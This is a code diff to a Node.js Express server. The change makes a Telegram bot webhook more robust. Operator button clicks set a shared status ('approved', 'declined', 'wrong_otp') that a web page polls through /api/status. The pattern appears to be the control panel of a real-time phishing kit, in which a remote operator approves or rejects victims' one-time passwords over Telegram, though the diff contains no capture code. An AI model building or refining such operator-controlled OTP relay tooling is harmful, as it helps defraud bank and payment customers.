@@ -102,28 +102,42 @@ app.get('/api/status', (req, res) => {
     res.json({ status: latestStatus });
 });
 
-// 3. Telegram Webhook to catch button clicks
-app.post('/webhook', express.json(), async (req, res) => {
-    console.log("WEBHOOK HIT RECEIVED:", JSON.stringify(req.body));
+// Telegram Webhook to catch button clicks
+app.all('/webhook', express.json(), async (req, res) => {
+    console.log("WEBHOOK HIT RECEIVED! Method:", req.method);
+    console.log("Body:", JSON.stringify(req.body));
+
+    if (req.method === 'GET') {
+        return res.status(200).send("Webhook endpoint is active and working!");
+    }
+
     const update = req.body;
-    if (update.callback_query) {
+    if (update && update.callback_query) {
         const action = update.callback_query.data;
-        
+
         if (action.startsWith("approve")) {
             latestStatus = "approved";
         } else if (action.startsWith("decline")) {
             latestStatus = "declined";
-        }  else if (action.startsWith("wrong") || action.startsWith("otp_wrong")) {
+        } else if (action.startsWith("wrong") || action.startsWith("otp_wrong")) {
             latestStatus = "wrong_otp";
-}
-        
+        }
+
         // Acknowledge click to Telegram so loading wheel stops on the button
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ callback_query_id: update.callback_query.id, text: "Action recorded!" })
-        });
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    callback_query_id: update.callback_query.id, 
+                    text: "Action recorded!" 
+                })
+            });
+        } catch (err) {
+            console.error("Error answering callback query:", err);
+        }
     }
+
     res.sendStatus(200);
 });
 
